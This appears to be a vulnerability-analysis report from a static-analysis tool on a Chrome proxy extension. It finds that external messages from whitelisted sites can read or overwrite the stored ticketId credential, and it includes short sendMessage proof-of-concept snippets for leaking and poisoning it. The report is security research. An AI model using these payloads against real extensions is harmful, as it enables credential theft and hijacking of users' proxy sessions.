# CoCo Analysis: onpjdedikjphpmpfjcafkmdmngchfaid

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3

---

## Sink 1: storage_sync_get_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/onpjdedikjphpmpfjcafkmdmngchfaid/opgen_generated_files/bg.js
Line 727: var storage_sync_get_source = {'key': 'value'};
Line 965: chrome.runtime.onMessageExternal.addListener(function(e,t,n){... n({ticketId:p}) ...})

**Code:**

```javascript
// Background script - Line 965
var p = void 0;
chrome.storage.sync.get("ticketid", function(e) {
    p = e.ticketid; // ← stored ticketid loaded into variable p
});

chrome.runtime.onMessageExternal.addListener(function(e, t, n) {
    console.log("Got external message:", e);
    if ("ticketId" == e.intent) {
        n({ticketId: p}); // ← stored ticketid sent back to external caller via sendResponse
    }
    // ... additional handler code
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any website whitelisted in manifest.json externally_connectable
// (*.veilduck.com/*, localhost:3000, *.veilduck.app/*)
chrome.runtime.sendMessage('onpjdedikjphpmpfjcafkmdmngchfaid',
    {intent: 'ticketId'},
    function(response) {
        console.log('Leaked ticketId:', response.ticketId);
    }
);
```

**Impact:** Information disclosure - external websites can retrieve the stored ticket ID credential from extension storage.

---

## Sink 2: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/onpjdedikjphpmpfjcafkmdmngchfaid/opgen_generated_files/bg.js
Line 965: chrome.runtime.onMessageExternal.addListener(function(e,t,n){... chrome.storage.sync.set({ticketid:p,"end-at":e["end-at"]}) ...})

**Code:**

```javascript
// Background script - Line 965
chrome.runtime.onMessageExternal.addListener(function(e, t, n) {
    console.log("Got external message:", e);
    if ("changeTicketId" == e.intent) {
        p = e.id; // ← attacker-controlled
        chrome.storage.sync.set({
            ticketid: p, // ← attacker-controlled data written to storage
            "end-at": e["end-at"] // ← attacker-controlled data written to storage
        }, function() {
            if (chrome.runtime.lastError) {
                console.log("Setting ticket id failed:", chrome.runtime.lastError.message);
                n({ticketId: null});
            } else {
                console.log("Setting ticket id succeeded");
                Object.keys(r).forEach(function(e) {
                    chrome.notifications.clear(e, function(e) {});
                    clearTimeout(r[e]);
                    delete r[e];
                });
                R.toOn();
                n({ticketId: p}); // ← attacker receives confirmation with poisoned value
            }
        });
    }
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From any whitelisted website (*.veilduck.com/*, localhost:3000, *.veilduck.app/*)
chrome.runtime.sendMessage('onpjdedikjphpmpfjcafkmdmngchfaid',
    {
        intent: 'changeTicketId',
        id: 'attacker_controlled_id',
        'end-at': '2099-12-31T23:59:59'
    },
    function(response) {
        console.log('Storage poisoned, new ticketId:', response.ticketId);
    }
);
```

**Impact:** Complete storage exploitation chain - attacker can poison the ticketId and end-at values in storage, and the poisoned ticketId is sent back to the attacker via sendResponse. The extension uses this ticketId for proxy authentication, so an attacker can hijack the proxy credentials.

---

## Sink 3: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink (end-at field)

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/onpjdedikjphpmpfjcafkmdmngchfaid/opgen_generated_files/bg.js
Line 965: chrome.storage.sync.set({ticketid:p,"end-at":e["end-at"]})

**Classification:** TRUE POSITIVE

This is the same vulnerability as Sink 2, just tracking the separate field "end-at". The attacker controls both fields written to storage through the same attack vector.

**Reason:** Same as Sink 2 - complete storage exploitation chain with external message trigger.
